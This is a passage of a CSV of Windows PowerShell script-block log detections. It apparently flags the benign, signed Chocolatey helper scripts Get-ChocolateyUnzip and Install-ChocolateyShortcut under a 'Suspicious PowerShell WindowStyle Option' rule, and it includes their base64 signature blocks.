ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xs","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: e80ddd53-40cb-4fd7-8441-1ba99d455693 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xs","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:32.573 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,62,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # 